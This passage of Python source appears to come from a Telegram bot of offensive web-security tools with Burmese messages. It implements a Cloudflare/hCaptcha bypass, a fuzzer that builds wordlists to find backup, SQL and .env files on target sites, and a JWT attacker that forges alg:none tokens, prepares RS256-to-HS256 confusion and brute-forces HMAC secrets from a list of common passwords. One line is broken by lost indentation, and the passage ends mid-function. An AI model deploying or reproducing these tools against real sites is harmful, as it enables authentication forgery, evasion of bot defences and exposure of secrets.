    async with db_lock:
        db = _load_db_sync()
        if context.args[0].lower() == "off":
            db["settings"]["force_channels"] = []
            _save_db_sync(db)
            await update.effective_message.reply_text("✅ Force Join ပိတ်လိုက်ပါပြီ")
            return
        channels = [a if a.startswith('@') else '@' + a for a in context.args]
        db["settings"]["force_channels"] = channels
        _save_db_sync(db)

    await update.effective_message.reply_text(
        f"✅ *Force Join set လုပ်ပြီး*\n\n"
        f"Channels: {', '.join(f'`{c}`' for c in channels)}\n\n"
        "Users တွေ join မလုပ်ရင် Bot သုံးခွင့် မရတော့ပါ\n"
        "⚠️ Bot ကို အဆိုပါ channel(s) မှာ admin အဖြစ် ထည့်ထားဖို့ မမေ့နဲ့",
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 📦  FEATURE 9 — Advanced APK Asset Extractor (/appassets)
# ══════════════════════════════════════════════════

_ASSET_CATEGORIES = {
    "images":   {'.png','.jpg','.jpeg','.gif','.webp','.svg','.bmp','.ico','.avif'},
    "audio":    {'.mp3','.wav','.ogg','.aac','.flac','.m4a','.opus'},
    "video":    {'.mp4','.webm','.mkv','.avi','.mov','.m4v','.3gp'},
    "layouts":  {'.xml'},
    "dex":      {'.dex'},
    "so_libs":  {'.so'},
    "fonts":    {'.ttf','.otf','.woff','.woff2'},
    "certs":    {'.pem','.cer','.crt','.p12','.pfx','.keystore','.jks'},
    "configs":  {'.json','.yaml','.yml','.properties','.cfg','.conf','.ini'},
    "scripts":  {'.js','.py','.sh','.rb','.php'},
    "docs":     {'.pdf','.txt','.md','.html','.htm'},
    "archives": {'.zip','.tar','.gz','.rar','.7z'},
}

def _categorize_asset(filename: str) -> str:
    ext = os.path.splitext(filename.lower())[1]
    for cat, exts in _ASSET_CATEGORIES.items():
        if ext in exts:
            return cat
    return "other"

def _extract_apk_assets_sync(filepath: str, wanted_cats: set, progress_cb=None) -> dict:
    """Extract assets from APK/IPA/ZIP by category."""
    result = {"files": {}, "stats": {}, "errors": []}

    if not zipfile.is_zipfile(filepath):
        result["errors"].append("Not a valid ZIP/APK/IPA file")
        return result

    with zipfile.ZipFile(filepath, 'r') as zf:
        names = zf.namelist()
        total = len(names)
        categorized = {}
        for name in names:
            cat = _categorize_asset(name)
            if cat in wanted_cats:
                categorized.setdefault(cat, []).append(name)

        result["stats"]["total_files"] = total
        for cat, files in categorized.items():
            result["stats"][cat] = len(files)

        # Extract to BytesIO zip
        import io
        out_buf = io.BytesIO()
        extracted = 0
        MAX_EXTRACT = 200  # max files per export
        with zipfile.ZipFile(out_buf, 'w', zipfile.ZIP_DEFLATED) as out_zf:
            for cat in wanted_cats:
                files = categorized.get(cat, [])
                for i, fname in enumerate(files[:MAX_EXTRACT]):
                    try:
                        data = zf.read(fname)
                        # Flatten long paths
                        short_name = f"{cat}/{os.path.basename(fname)}"
                        out_zf.writestr(short_name, data)
                        extracted += 1
                        if progress_cb and extracted % 20 == 0:
                            progress_cb(f"📦 Extracting... `{extracted}` files")
                    except Exception as e:
                        result["errors"].append(f"{fname}: {e}")

        result["extracted"] = extracted
        result["zip_buffer"] = out_buf
    return result


async def cmd_appassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/appassets — Extract specific asset types from uploaded APK/IPA/ZIP"""
    uid = update.effective_user.id

    # Force join check
    if not await check_force_join(update, context):
        return

    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    # Check if user has a recently uploaded file
    async with db_lock:
        db = _load_db_sync()
    u = get_user(db, uid)
    last_app = u.get("last_uploaded_app")

    if not last_app or not os.path.exists(last_app):
        await update.effective_message.reply_text(
            "📦 *APK Asset Extractor*\n\n"
            "APK / IPA / ZIP / JAR ဖိုင်ကို ဦးစွာ Chat ထဲ Upload လုပ်ပါ\n"
            "Upload ပြီးရင် `/appassets` ကို ရိုက်ပြီး Category ရွေးပါ\n\n"
            "Extract လုပ်နိုင်သော Category များ:\n"
            "🖼 `images` — PNG, JPG, SVG, WebP\n"
            "🎵 `audio` — MP3, WAV, OGG, AAC\n"
            "🎬 `video` — MP4, WebM, MKV\n"
            "📐 `layouts` — XML Layout files\n"
            "⚙️ `dex` — classes.dex (bytecode)\n"
            "🔧 `so_libs` — .so Native libraries\n"
            "🔤 `fonts` — TTF, OTF, WOFF\n"
            "🔒 `certs` — PEM, CER, Keystores\n"
            "📋 `configs` — JSON, YAML, Properties\n"
            "📝 `scripts` — JS, Python, Shell\n"
            "📄 `docs` — PDF, TXT, HTML\n"
            "🗜 `archives` — ZIP, TAR, GZ",
            parse_mode='Markdown'
        )
        return

    # Parse category args
    valid_cats = set(_ASSET_CATEGORIES.keys())
    wanted_cats = set()
    if context.args:
        for a in context.args:
            a = a.lower().strip()
            if a == "all":
                wanted_cats = valid_cats.copy()
                break
            if a in valid_cats:
                wanted_cats.add(a)

    if not wanted_cats:
        # Build selection keyboard
        rows = []
        cats_list = list(valid_cats)
        for i in range(0, len(cats_list), 3):
            row = [InlineKeyboardButton(c, callback_data=f"apa_{c}") for c in cats_list[i:i+3]]
            rows.append(row)
        rows.append([InlineKeyboardButton("📦 ALL Categories", callback_data="apa_all")])
        await update.effective_message.reply_text(
            "📦 *Extract လုပ်မည့် Category ရွေးပါ:*\n\n"
            "_(သို့မဟုတ်)_ `/appassets images audio layouts` ဟု ရိုက်နိုင်သည်",
            reply_markup=InlineKeyboardMarkup(rows),
            parse_mode='Markdown'
        )
        return

    await _do_appassets_extract(update, context, last_app, wanted_cats)


async def _do_appassets_extract(update_or_msg, context, filepath: str, wanted_cats: set):
    import io
    # Support both Update objects and raw Message objects
    if hasattr(update_or_msg, 'effective_message'):
        target_msg  = update_or_msg.effective_message
        chat_id     = update_or_msg.effective_chat.id
    else:
        # Raw Message (from callback)
        target_msg  = update_or_msg
        chat_id     = update_or_msg.chat_id

    fname = os.path.basename(filepath)
    msg = await target_msg.reply_text(
        f"📦 *Asset Extractor — `{fname}`*\n\n"
        f"Categories: `{', '.join(sorted(wanted_cats))}`\n"
        "⏳ Extracting...",
        parse_mode='Markdown'
    )
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"📦 *Extracting `{fname}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(
            _extract_apk_assets_sync, filepath, wanted_cats,
            lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    if result.get("errors") and result.get("extracted", 0) == 0:
        error_msg = '\n'.join(result['errors'][:3])
await msg.edit_text(f"❌ `{error_msg}`", parse_mode='Markdown')

    stats = result["stats"]
    extracted = result.get("extracted", 0)
    zip_buf: io.BytesIO = result.get("zip_buffer")

    if extracted == 0:
        stat_lines = "\n".join(f"  {cat}: `0`" for cat in sorted(wanted_cats))
        await msg.edit_text(
            f"📭 *No files found*\n\nCategory တွေမှာ ဖိုင် မတွေ့ပါ:\n{stat_lines}",
            parse_mode='Markdown'
        )
        return

    stat_lines = "\n".join(
        f"  {cat}: `{stats.get(cat, 0)}`" for cat in sorted(wanted_cats)
    )
    zip_buf.seek(0)
    zip_size_mb = zip_buf.getbuffer().nbytes / 1024 / 1024

    await msg.edit_text(
        f"✅ *Extraction ပြီးပါပြီ*\n\n"
        f"📦 Extracted: `{extracted}` files\n"
        f"💾 Size: `{zip_size_mb:.2f}` MB\n\n"
        f"*Per Category:*\n{stat_lines}\n\n"
        "📤 ZIP upload နေပါသည်...",
        parse_mode='Markdown'
    )

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(os.path.basename(filepath))[0])
    zip_name = f"assets_{safe_fname}_{ts}.zip"

    try:
        await context.bot.send_document(
            chat_id=chat_id,
            document=zip_buf,
            filename=zip_name,
            caption=(
                f"📦 *APK Assets — `{os.path.basename(filepath)}`*\n"
                f"📂 `{extracted}` files extracted\n"
                f"💾 `{zip_size_mb:.2f}` MB\n"
                f"Categories: `{', '.join(sorted(wanted_cats))}`"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        await target_msg.reply_text(f"❌ Upload error: `{e}`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🤖  FEATURE 10 — Anti-Bot & Captcha Bypass (/antibot)
# ══════════════════════════════════════════════════

async def cmd_antibot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/antibot <url> — Cloudflare/hCaptcha bypass via human-like Puppeteer"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/antibot https://example.com`\n\n"
            "🤖 *Bypass Methods:*\n"
            "  ① Human-like mouse movement + delay simulation\n"
            "  ② Random viewport + timezone spoofing\n"
            "  ③ Canvas/WebGL fingerprint randomization\n"
            "  ④ Stealth Puppeteer (navigator.webdriver=false)\n"
            "  ⑤ Cloudflare Turnstile passive challenge wait\n"
            "  ⑥ hCaptcha detection + fallback screenshot\n\n"
            "⚙️ *Requirements:*\n"
            "  `node js_antibot.js` script + puppeteer-extra-plugin-stealth\n\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    if not PUPPETEER_OK:
        await update.effective_message.reply_text(
            "❌ *Puppeteer မရှိသေးပါ*\n\n"
            "Setup:\n"
            "```\nnpm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth\n```",
            parse_mode='Markdown'
        )
        return

    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🤖 *Anti-Bot Bypass — `{domain}`*\n\n"
        "① Stealth mode on\n"
        "② Human-like behavior injecting...\n"
        "③ Waiting for challenge...\n⏳",
        parse_mode='Markdown'
    )

    antibot_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "js_antibot.js")

    def _run_antibot():
        if not os.path.exists(antibot_script):
            # Inline fallback — use existing js_render with stealth hint
            return _run_antibot_fallback(url)
        try:
            result = subprocess.run(
                ["node", antibot_script, url],
                capture_output=True, timeout=90, text=True, shell=False
            )
            if result.returncode == 0 and result.stdout.strip():
                return {"success": True, "html": result.stdout, "method": "stealth_puppeteer"}
            return {"success": False, "error": result.stderr[:200] or "Empty response"}
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Timeout (90s) — challenge too complex"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _run_antibot_fallback(url: str) -> dict:
        """Fallback — try puppeteer with delay headers if no antibot script"""
        if not PUPPETEER_OK:
            return {"success": False, "error": "Puppeteer not available"}
        try:
            result = subprocess.run(
                ["node", JS_RENDER, url],
                capture_output=True, timeout=60, text=True, shell=False
            )
            if result.returncode == 0 and result.stdout.strip():
                return {"success": True, "html": result.stdout, "method": "js_render_fallback"}
            return {"success": False, "error": "JS render failed"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    try:
        res = await asyncio.to_thread(_run_antibot)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    if not res["success"]:
        await msg.edit_text(
            f"❌ *Bypass မအောင်မြင်ဘူး*\n\n"
            f"Error: `{res['error']}`\n\n"
            "_Challenge level မြင့်လွန်းနိုင်သည် သို့မဟုတ် manual CAPTCHA solve လိုနိုင်ပါသည်_",
            parse_mode='Markdown'
        )
        return

    html = res["html"]
    method = res.get("method", "unknown")
    html_size_kb = len(html.encode()) / 1024

    # Save and send as file
    import io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    html_buf = io.BytesIO(html.encode('utf-8', errors='replace'))

    await msg.edit_text(
        f"✅ *Bypass အောင်မြင်ပါပြီ!*\n\n"
        f"🌐 `{domain}`\n"
        f"⚙️ Method: `{method}`\n"
        f"📄 HTML Size: `{html_size_kb:.1f}` KB\n\n"
        "📤 HTML file upload နေပါသည်...",
        parse_mode='Markdown'
    )

    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=html_buf,
            filename=f"antibot_{safe_d}_{ts}.html",
            caption=(
                f"🤖 *Anti-Bot Bypass — `{domain}`*\n"
                f"Method: `{method}`\n"
                f"Size: `{html_size_kb:.1f}` KB"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.effective_message.reply_text(f"❌ Upload: `{e}`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🗂️  FEATURE 11 — Smart Context-Aware Fuzzer (/smartfuzz)
#     CeWL-style wordlist generator + fuzzer
# ══════════════════════════════════════════════════

_SMARTFUZZ_STOP_WORDS = {
    'the','a','an','in','on','at','for','of','to','is','are','was','were',
    'and','or','but','if','with','this','that','from','by','not','it',
    'be','as','we','you','he','she','they','have','has','had','do','does',
    'did','will','would','could','should','may','might','can','our','your',
    'their','its','which','who','what','how','when','where','why',
}

def _build_context_wordlist(url: str, progress_cb=None) -> tuple:
    """
    CeWL-style: scrape target, extract unique words → generate permutations.
    Returns (wordlist: list, raw_words: list)
    """
    parsed = urlparse(url)
    root   = f"{parsed.scheme}://{parsed.netloc}"
    domain_parts = parsed.netloc.replace('www.', '').split('.')

    all_words = set()

    # ── Scrape homepage + up to 3 internal pages ──
    try:
        r = requests.get(url, headers=_get_headers(), timeout=12, verify=False, proxies=proxy_manager.get_proxy())
        soup = BeautifulSoup(r.text, 'html.parser')
        if progress_cb:
            progress_cb("🌐 Homepage scraped")

        # Extract text words
        for tag in soup.find_all(['h1','h2','h3','h4','title','p','li','span','a','button','label']):
            text = tag.get_text(separator=' ')
            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', text):
                all_words.add(w.lower())

        # Extract from meta tags
        for meta in soup.find_all('meta'):
            content = meta.get('content', '') + ' ' + meta.get('name', '')
            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', content):
                all_words.add(w.lower())

        # Extract from JS variables / identifiers
        for script in soup.find_all('script'):
            src_text = script.string or ''
            for w in re.findall(r'(?:var|let|const|function)\s+([a-zA-Z_][a-zA-Z0-9_]{2,20})', src_text):
                all_words.add(w.lower())

        # Extract from class names and IDs
        for tag in soup.find_all(True):
            for attr in ('class', 'id', 'name'):
                vals = tag.get(attr, [])
                if isinstance(vals, str):
                    vals = [vals]
                for v in vals:
                    for w in re.split(r'[-_\s]', v):
                        if 3 <= len(w) <= 20:
                            all_words.add(w.lower())

        # Crawl 3 more internal pages
        links = list(get_internal_links(r.text, url))[:3]
        for link in links:
            try:
                r2 = requests.get(link, headers=_get_headers(), timeout=8, verify=False, proxies=proxy_manager.get_proxy())
                soup2 = BeautifulSoup(r2.text, 'html.parser')
                for tag in soup2.find_all(['h1','h2','h3','title','p']):
                    for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', tag.get_text()):
                        all_words.add(w.lower())
            except Exception:
                pass

    except Exception as e:
        if progress_cb:
            progress_cb(f"⚠️ Scrape error: {e}")

    # Add domain parts
    for part in domain_parts:
        all_words.add(part.lower())

    # Filter stop words + numeric-only
    raw_words = sorted(
        w for w in all_words
        if w not in _SMARTFUZZ_STOP_WORDS and not w.isdigit() and len(w) >= 3
    )

    if progress_cb:
        progress_cb(f"📝 Raw words: `{len(raw_words)}`")

    # ── Generate permutations ──────────────────────
    current_year = datetime.now().year
    years        = [str(y) for y in range(current_year - 3, current_year + 2)]
    suffixes      = ['', '_backup', '_old', '_bak', '.bak', '_2025', '_2024',
                     '_dev', '_test', '_staging', '_prod', '_new', '_v2',
                     '.zip', '.sql', '.tar.gz', '.env', '.json']
    prefixes      = ['', 'backup_', 'old_', 'dev_', 'test_', 'admin_', 'api_',
                     '.', '_']

    wordlist = set()

    # Base words
    for w in raw_words[:80]:   # top 80 words
        wordlist.add(w)
        wordlist.add(w + '.php')
        wordlist.add(w + '.html')
        wordlist.add(w + '.txt')
        # Year combos
        for yr in years[:3]:
            wordlist.add(f"{w}_{yr}")
            wordlist.add(f"{w}_{yr}.zip")
            wordlist.add(f"{w}_{yr}.sql")
        # Suffix combos
        for suf in suffixes[:8]:
            wordlist.add(w + suf)
        # Prefix combos
        for pfx in prefixes[:5]:
            if pfx:
                wordlist.add(pfx + w)

    # Domain-specific combos
    for part in domain_parts[:3]:
        for yr in years:
            wordlist.add(f"{part}_{yr}")
            wordlist.add(f"{part}_{yr}.zip")
            wordlist.add(f"{part}_backup_{yr}")
            wordlist.add(f"backup_{part}")
            wordlist.add(f"{part}_db.sql")
            wordlist.add(f"{part}.sql")

    final_wordlist = sorted(wordlist)
    if progress_cb:
        progress_cb(f"🎯 Wordlist: `{len(final_wordlist)}` entries generated")

    return final_wordlist, raw_words


def _smartfuzz_probe_sync(base_url: str, wordlist: list, progress_cb=None) -> list:
    """Probe all wordlist entries against target."""
    found = []

    # Baseline fingerprint
    try:
        r404 = requests.get(
            base_url.rstrip('/') + '/xyznotfound_abc123_never_exists',
            proxies=proxy_manager.get_proxy(), timeout=6, verify=False, headers=_get_headers()
        )
        baseline_status = r404.status_code
        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
        baseline_size   = len(r404.content)
    except Exception:
        baseline_status, baseline_hash, baseline_size = 404, '', 0

    def _probe(word):
        target = base_url.rstrip('/') + '/' + word.lstrip('/')
        try:
            r = requests.get(target, timeout=5, verify=False, headers=_get_headers(),
                             proxies=proxy_manager.get_proxy(), allow_redirects=True, stream=True)
            chunk = b''
            for part in r.iter_content(512):
                chunk += part
                if len(chunk) >= 512: break
            r.close()
            r_hash = hashlib.md5(chunk[:512]).hexdigest()
            r_size = len(chunk)
            # Filter baseline catch-all
            if r.status_code == baseline_status:
                if r_hash == baseline_hash: return None
                if baseline_size > 0 and abs(r_size - baseline_size) < 30: return None
            if r.status_code in (200, 201, 301, 302, 401, 403, 500):
                return {"url": target, "word": word, "status": r.status_code, "size": r_size}
        except Exception:
            pass
        return None

    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, w): w for w in wordlist}
        for fut in concurrent.futures.as_completed(fmap, timeout=120):
            done += 1
            if progress_cb and done % 30 == 0:
                progress_cb(f"🧪 Fuzzing: `{done}/{len(wordlist)}` | Found: `{len(found)}`")
            try:
                res = fut.result(timeout=6)
                if res:
                    found.append(res)
            except Exception:
                pass

    found.sort(key=lambda x: (x['status'] != 200, x['status']))
    return found


async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/smartfuzz <url> — Context-aware wordlist builder + fuzzer"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/smartfuzz https://example.com`\n\n"
            "🗂️ *Smart Fuzzer — 3 Phases:*\n\n"
            "① *Context Harvesting* — Target ကို scrape ပြီး\n"
            "   Company name, product name, developer identifiers,\n"
            "   JS variables, class/ID names, meta keywords\n"
            "   တွေကို ဆုပ်ကိုင်ပါမည်\n\n"
            "② *Wordlist Generation* (CeWL-style)\n"
            "   ရလာတဲ့ words တွေကို backup/year/suffix combos\n"
            "   နဲ့ permutate လုပ်ပြီး custom dictionary ဆောက်ပါမည်\n"
            "   Example: `companyname_backup_2025.zip`\n\n"
            "③ *Smart Fuzzing*\n"
            "   Custom wordlist ဖြင့် target ကို probe လုပ်ပြီး\n"
            "   Baseline fingerprinting ဖြင့် false-positive စစ်ပါမည်\n\n"
            "📦 Wordlist + Results ကို export ပေးမည်\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).netloc
    base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    msg = await update.effective_message.reply_text(
        f"🗂️ *Smart Fuzzer — `{domain}`*\n\n"
        "① Harvesting words from target...\n"
        "② Building custom wordlist...\n"
        "③ Fuzzing...\n\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🗂️ *SmartFuzz — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        wordlist, raw_words = await asyncio.to_thread(
            _build_context_wordlist, url, lambda t: progress_q.append(t)
        )
        if not wordlist:
            prog.cancel()
            await msg.edit_text("❌ Words ဆွဲထုတ်မရပါ — site ကို access လုပ်မရနိုင်ပါ", parse_mode='Markdown')
            return

        progress_q.append(f"✅ Wordlist: `{len(wordlist)}` words\n🧪 Fuzzing နေပါသည်...")
        found = await asyncio.to_thread(
            _smartfuzz_probe_sync, base_url, wordlist,
            lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    # ── Summary ───────────────────────────────────
    hits_200   = [f for f in found if f['status'] == 200]
    hits_auth  = [f for f in found if f['status'] in (401, 403)]
    hits_redir = [f for f in found if f['status'] in (301, 302)]
    hits_err   = [f for f in found if f['status'] == 500]

    lines = [
        f"🗂️ *SmartFuzz Results — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"📝 Words scraped: `{len(raw_words)}`",
        f"🎯 Wordlist generated: `{len(wordlist)}`",
        f"🔍 Total probed: `{len(wordlist)}`",
        f"✅ Found: `{len(found)}` interesting",
        "",
    ]

    if hits_200:
        lines.append(f"*✅ HTTP 200 — Accessible ({len(hits_200)}):*")
        for h in hits_200[:15]:
            lines.append(f"  🟢 `/{h['word']}` → `{h['size']}B`")
        lines.append("")

    if hits_auth:
        lines.append(f"*🔒 Protected 401/403 ({len(hits_auth)}):*")
        for h in hits_auth[:10]:
            lines.append(f"  🔐 `/{h['word']}` [{h['status']}]")
        lines.append("")

    if hits_redir:
        lines.append(f"*↩️ Redirects ({len(hits_redir)}):*")
        for h in hits_redir[:5]:
            lines.append(f"  ↪ `/{h['word']}` [{h['status']}]")
        lines.append("")

    if hits_err:
        lines.append(f"*⚠️ Server Errors 500 ({len(hits_err)}):*")
        for h in hits_err[:5]:
            lines.append(f"  🔴 `/{h['word']}`")
        lines.append("")

    if not found:
        lines.append("📭 _Interesting paths မတွေ့ပါ_")

    lines.append("⚠️ _Authorized testing only_")

    report = "\n".join(lines)
    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')

    # ── Export wordlist + results as ZIP ─────────
    import io, zipfile as _zf
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    zip_buf = io.BytesIO()

    with _zf.ZipFile(zip_buf, 'w', _zf.ZIP_DEFLATED) as zf:
        zf.writestr("wordlist.txt", "\n".join(wordlist))
        zf.writestr("raw_words.txt", "\n".join(sorted(raw_words)))
        result_lines = [f"{f['status']}\t{f['url']}\t{f['size']}B" for f in found]
        zf.writestr("results.txt", "\n".join(result_lines) or "No results")
        zf.writestr("results.json", json.dumps({
            "domain": domain, "scanned_at": datetime.now().isoformat(),
            "wordlist_size": len(wordlist), "raw_words": len(raw_words),
            "found": found
        }, indent=2))

    zip_buf.seek(0)
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=zip_buf,
            filename=f"smartfuzz_{safe_d}_{ts}.zip",
            caption=(
                f"🗂️ *SmartFuzz Export — `{domain}`*\n"
                f"📝 Wordlist: `{len(wordlist)}` | Found: `{len(found)}`\n"
                "Files: `wordlist.txt` + `raw_words.txt` + `results.json`"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.warning("SmartFuzz export error: %s", e)


# ══════════════════════════════════════════════════
# 🎟️  FEATURE 12 — Advanced JWT Attacker & Cracker (/jwtattack)
# ══════════════════════════════════════════════════

import base64 as _b64

_JWT_COMMON_SECRETS = [
    "secret","password","123456","admin","key","jwt","token","test",
    "changeme","mysecret","your-256-bit-secret","your-secret-key",
    "secret_key","jwt_secret","app_secret","supersecret","private",
    "qwerty","abc123","letmein","welcome","monkey","dragon","master",
    "your-secret","secretkey","jwtpassword","pass","1234","12345",
    "123456789","qwerty123","iloveyou","princess","rockyou","football",
    "!@#$%^&*","pass123","admin123","root","toor","alpine","default",
    "secret123","jwt-secret","token-secret","api-secret","app-key",
    "HS256","RS256","none","null","undefined","example",
]

def _jwt_decode_payload(token: str) -> dict:
    """Decode JWT header + payload without verification."""
    parts = token.strip().split('.')
    if len(parts) != 3:
        return {"error": "Not a valid JWT (needs 3 parts separated by '.')"}
    try:
        def _b64_decode(s: str) -> dict:
            # Correct padding: -len(s) % 4 gives 0 when already aligned
            s = s.replace('-', '+').replace('_', '/')
            s += '=' * (-len(s) % 4)
            return json.loads(_b64.b64decode(s).decode('utf-8', 'replace'))
        header  = _b64_decode(parts[0])
        payload = _b64_decode(parts[1])
        return {"header": header, "payload": payload, "signature": parts[2][:20] + "..."}
    except Exception as e:
        return {"error": str(e)}


def _jwt_none_attack(token: str) -> dict:
    """None algorithm bypass — forge unsigned token."""
    parts = token.split('.')
    if len(parts) != 3:
        return {"success": False}
    try:
        header_dec = _jwt_decode_payload(token)["header"]
        orig_alg   = header_dec.get("alg", "HS256")
        forged_header = dict(header_dec)
        forged_header["alg"] = "none"
        def _b64e(d: dict) -> str:
            return _b64.b64encode(json.dumps(d, separators=(',',':')).encode()).decode().rstrip('=').replace('+','-').replace('/','_')
        forged = f"{_b64e(forged_header)}.{parts[1]}."
        return {
            "success": True,
            "original_alg": orig_alg,
            "forged_token":  forged,
            "method": "none_alg_bypass",
            "note": "Signature removed — send with empty sig. Some servers accept this."
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _jwt_alg_confusion(token: str) -> dict:
    """Algorithm confusion — RS256→HS256 concept (no public key needed for demo)."""
    parts = token.split('.')
    if len(parts) != 3:
        return {"success": False}
    try:
        header_dec = _jwt_decode_payload(token)["header"]
        orig_alg   = header_dec.get("alg", "HS256")
        if orig_alg == "RS256":
            confused = dict(header_dec)
            confused["alg"] = "HS256"
            def _b64e(d: dict) -> str:
                return _b64.b64encode(json.dumps(d, separators=(',',':')).encode()).decode().rstrip('=').replace('+','-').replace('/','_')
            confused_header = _b64e(confused)
            note = (
                "RS256→HS256 confusion: Change alg to HS256 then sign with public key as secret.\n"
                "Tool: python-jwt or jwt_tool.py\n"
                "CMD: python3 jwt_tool.py -X k -pk pubkey.pem <token>"
            )
            return {"success": True, "original_alg": "RS256", "target_alg": "HS256",
                    "confused_header": confused_header, "method": "alg_confusion", "note": note}
        return {"success": False, "note": f"Alg is `{orig_alg}` (RS256 only for this attack)"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def _jwt_brute_force(token: str, wordlist: list = None, progress_cb=None) -> dict:
    """Brute-force JWT HMAC secret from wordlist."""
    import hmac as _hmac
    parts = token.split('.')
    if len(parts) != 3:
        return {"cracked": False, "error": "Invalid JWT"}

    target_algs = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }

    # Detect algorithm
    header_info = _jwt_decode_payload(token).get("header", {})
    alg = header_info.get("alg", "HS256")
    if alg not in target_algs:
        return {"cracked": False, "error": f"Algorithm `{alg}` not brute-forceable (needs HMAC)"}

    hash_fn   = target_algs[alg]
    msg_bytes = f"{parts[0]}.{parts[1]}".encode()

    # Decode target signature
    sig_pad = parts[2].replace('-', '+').replace('_', '/')
    sig_pad += '=' * (-len(sig_pad) % 4)
    try:
        target_sig = _b64.b64decode(sig_pad)
    except Exception:
        return {"cracked": False, "error": "Cannot decode signature"}

    wl = wordlist or _JWT_COMMON_SECRETS
    total = len(wl)

    for i, secret in enumerate(wl):
        if progress_cb and i % 50 == 0:
            progress_cb(f"🔑 Brute-force: `{i}/{total}` tried")
        try:
            computed = _hmac.HMAC(secret.encode(), msg_bytes, hash_fn).digest()
            if computed == target_sig:
                return {"cracked": True, "secret": secret, "alg": alg, "tried": i + 1}
        except Exception:
            continue

    return {"cracked": False, "tried": total, "alg": alg}


async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/jwtattack <token> — Decode, attack, and crack JWT tokens"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/jwtattack <token>`\n\n"
            "🎟️ *JWT Attack Phases:*\n\n"
            "① *Decode* — Header + Payload reveal\n"
            "   Algorithm, expiry, user roles, claims\n\n"
            "② *None Algorithm Bypass*\n"
            "   `alg: none` — unsigned token forge\n\n"
            "③ *Algorithm Confusion*\n"
            "   RS256 → HS256 confusion attack\n\n"
            "④ *Secret Key Brute-force*\n"
            f"   `{len(_JWT_COMMON_SECRETS)}` common secrets + dictionary\n\n"
